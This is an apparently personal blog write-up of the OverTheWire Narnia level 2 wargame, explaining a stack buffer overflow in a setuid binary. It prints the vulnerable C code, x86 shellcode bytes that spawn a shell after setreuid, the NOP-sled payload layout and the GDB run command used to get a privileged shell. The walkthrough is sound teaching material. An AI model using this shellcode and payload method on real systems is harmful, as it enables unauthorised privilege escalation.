---
title: "Privilege Escalation via Buffer Overflow: Case Study on Narnia"
description: In this article, I go over my journey from understanding memory layouts to achieving privilege escalation through a buffer overflow exploit, using OverTheWire Narnia as a case study.
image: images/post/privilege-escalation-via-buffer-overflow-case-study-on-narnia/thumbnail.png
authors:
  - Nithik R
date: 2026-04-08T14:24:14+05:30
categories:
  - Binary Exploitation
tags:
  - Cybersecurity
  - Buffer Overflow
  - Memory
postType: featured
draft: false
---

In this article, I go over my journey from understanding memory layouts to achieving privilege escalation through a buffer overflow exploit, using OverTheWire Narnia as a case study.  

This article uses level 2 of [Narnia](https://overthewire.org/wargames/narnia/) to learn about basic binary exploitation.

---

<br>

## Identifying the Vulnerability

An x86 Linux executable file is given. It is a `setuid` binary owned by a more privileged user as we can see:
```sh
$ ls -l narnia2
-r-sr-x--- 1 narnia3 narnia2 11284 Apr  3 15:20 narnia2
```

<br>   

This is important because it means that if we can hijack execution, the process will be running with elevated privileges. It was compiled from the following code:  


```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char * argv[]){
    char buf[128];

    if(argc == 1){
        exit(1);
    }
    strcpy(buf,argv[1]);
    printf("%s", buf);

    return 0;
}
```

This code has a very obvious vulnerability. An array named `buf` is declared with a size of 128 bytes. It takes one argument from the command line and the `strcpy` function copies it into `buf`. However, the size of the input string is not checked. From the [man](https://man7.org/linux/man-pages/man3/strcpy.3.html) page of `strcpy` we get to know that the function just copies the string, also without checking the size. This implies that inputting a string larger than the size of `buf` will cause a buffer overflow and overwrite the memory beyond it.

---

<br>

## Buffer Overflow

This section briefly explains how a buffer overflow works before proceeding with the exploit to the given code.

### Memory Layout

When a program is run in C, it is given a certain amount of virtual memory. Each byte of memory has an address, usually expressed in hex. This is what it is generally arranged like, from lower addresses to higher:

- Text segment: Compiled machine code
- Initialised / BSS data: Global and static variables
- Heap: Dynamically allocated memory (grows from lower to higher address)
- Stack: Local variables and function calls (grows from higher to lower address)

{{< image src="https://upload.wikimedia.org/wikipedia/commons/6/6e/C-memlayout.svg" caption="C Memory Layout" alt="C Memory Layout" height="" width="" position="center" command="fill" option="q100" class="img-fluid" title="C Memory Layout: Yanpas, CC BY-SA 4.0 https://creativecommons.org/licenses/by-sa/4.0), via Wikimedia Commons" webp="false" >}}

### Stack Frame

When a function is called, a stack frame is created. It is a region in the stack. A simplified layout looks like:

```sh
High addresses
-----------------------
Return Address
Base Pointer
Local Variables
-----------------------
Low addresses
```

<br>  

If an array `char A[32]` is declared first and then an array `char B[32]`, the stack would look like this:

```sh
High addresses
-----------------------
Return Address
Base Pointer
A
B
-----------------------
Low addresses
```

<br>  

`B` comes below `A` because the stack grows downwards and it was declared after `A`. However, when data is written into the arrays, they are written upwards.

### Overflow

The arrays `A` and `B` were declared to be 32 bytes each. Now, if a 33 byte string is written onto `B`, the first 32 bytes would fit in it, but the last byte would "overflow" into `A`, causing any existing data to be overwritten as well.

If the string being written onto `B` is long enough, it can overwrite `A` completely and even overwrite the base pointer and the return address, effectively giving us full control over some important pointers. This idea is what makes buffer overflows highly dangerous.

---

<br>

## The Exploit

In the given code, `buf` is a 128 byte array. It is the only variable declared in the code and hence the stack frame must look something like this:

```sh
High addresses
-----------------------
Return Address
Base Pointer
buf[128]
-----------------------
Low addresses
```

<br>  

My initial thought was that I could overflow `buf` just enough to overwrite the return address. The return address is a pointer to the segment of code to which the control has to be returned to, which basically means that it points to what has to be executed after the current function has finished executing. Being able to overwrite this means that we can decide which section of the stack is executed next.

The plan was to fill `buf` with a [shellcode](https://www.hackingarticles.in/64-bit-linux-assembly-and-shellcoding/) and point the return address back into `buf` itself. Since the binary is setuid, the process runs with the owner's privileges, so a shell spawned from within it would give us a privileged shell. However, for this to work, the shellcode needed to call `setreuid(geteuid(), geteuid())` before spawning the shell. Without this, the elevated effective UID gets dropped when the shell starts. More about UIDs can be read [here](https://en.wikipedia.org/wiki/User_identifier).

I used the following 34-byte x86 shellcode which I got from [here](https://www.exploit-db.com/exploits/13316):

```c
char shellcode[] = "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46"
                   "\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68"
                   "\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80";
```

<br>  

This shellcode calls `geteuid`, passes the result to `setreuid` to lock in the elevated UID, then calls `execve("/bin/sh", 0, 0)`.


### Payload Layout

The total payload needs to be 136 bytes: 128 bytes to fill `buf`, 4 bytes to overwrite the saved base pointer, and 4 bytes to overwrite the return address. I used [GDB](https://www.gnu.org/software/gdb/) to find the address in the stack where `buf` was located and used this to overwrite the return address. I prefixed the shellcode with a [NOP sled](https://en.wikipedia.org/wiki/NOP_slide). By filling the beginning of `buf` with NOPs, I create a wide landing zone. The return address only needs to point somewhere into the sled, and execution will slide right into the shellcode.

The layout looked like this:

```sh
[96 bytes NOP sled] + [34 bytes shellcode] + [2 bytes NOP pad] + [4 bytes ret addr]
= 136 bytes total
```

<br>  

The 2 NOP bytes after the shellcode pad the saved base pointer slot. 

I used `env -i gdb narnia2` which runs GDB without the usual environment variables, which helps minimise the shift in addresses when the executable is later run outside GDB. The payload was passed as a command line argument inside GDB:

```bash
run $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x90" * 96 + b"\x6a\x31..." + b"\x90\x90" + b"\x10\xdd\xff\xff")')
```

### Attempt 1: SIGSEGV Inside the Shellcode

The first run crashed with a segmentation fault at `0xffffdd66`, which I found to be right in the middle of the shellcode. To understand why, I used `catch syscall` in GDB to trace every [syscall](https://en.wikipedia.org/wiki/System_call). The output showed that `geteuid` and `setreuid` both completed successfully, but execution never reached `execve`, meaning the crash happened in between.

Inspecting the registers at the crash point revealed the problem. After `setreuid` returned, ESP was at `0xffffdd70` which is just past the return address slot at the top of the stack. The shellcode then began building the `/bin/sh` string by pushing bytes onto the stack. Each `push` decrements ESP by 4 and writes to it, which meant ESP was now walking backwards into the shellcode itself, corrupting it mid-execution before `execve` could ever be reached.

### Attempt 2: Fixing the Stack Pointer

The fix was to add a `sub esp, 0x30` instruction (`\x83\xec\x30`) at the very beginning of the shellcode. This moves ESP down by 48 bytes into safe territory before any pushes happen, so the string building no longer tramples the shellcode. The updated payload became:

```sh
[93 bytes NOP sled] + [\x83\xec\x30] + [34 bytes shellcode] + [2 bytes NOP pad] + [4 bytes ret addr]
```

<br>  

This time, execution slid through the NOP sled, hit the `sub esp`, moved the stack pointer to safety, and the shellcode ran cleanly. A shell was obtained inside GDB.

### Running Outside GDB

The shell obtained inside GDB is not a privileged shell due to security features. Getting it to work outside GDB is a separate challenge. I ran the program with `env -i ./narnia2 $(python3 -c '...')` Even with `env -i` used for both GDB and the executable, stack addresses shift slightly between the two. The return address that worked in GDB will likely land a few bytes off outside it and so this gave me:
`Illegal instruction (core dumped)`

Since the NOP sled is 93 bytes wide, there is a reasonable margin for error. The approach is to brute force the return address in small steps. A script can be run to try addresses in both the positive and negative direction from the GDB address. 

In this case, I just had to increase the address by 32 bytes and it landed in the NOP sled, giving me the privileged shell as desired:
```sh
$ whoami
narnia3
```

---

<br>

This exploit worked because of a combination of multiple seemingly small vulnerabilities: an unchecked `strcpy` function, a setuid binary, and a stack that is both writeable and executable.

In real-world systems, there most definitely are protections against these. However it makes a great learning environment to master the foundations.
